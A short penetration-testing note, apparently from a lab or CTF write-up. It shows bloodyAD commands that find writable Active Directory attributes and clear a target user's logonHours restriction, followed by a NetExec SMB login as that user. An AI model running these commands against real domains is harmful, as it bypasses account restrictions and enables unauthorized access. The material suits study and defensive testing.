# LogonHours

This ACE is implemented to apply account lockout on a specific account. But it can be removed using this command so that you can log back in it. If you’ve specific Permissions

Querying for a detailed report we see we have write permissions over the logonHours.

```
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -k get writable --detail
```


The `Write` permission lets us clear it outright with bloodyAD's `set object` module.

```
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -k set object <TARGET_USER> logonHours
```

We try to authenticate as jason`.caldwell` using NetExec again, and we authenticate successfully.

```
nxc smb -k <DC_FQDN> -u '<TARGET_USER>' -p '<PASSWORD>' --shares
```

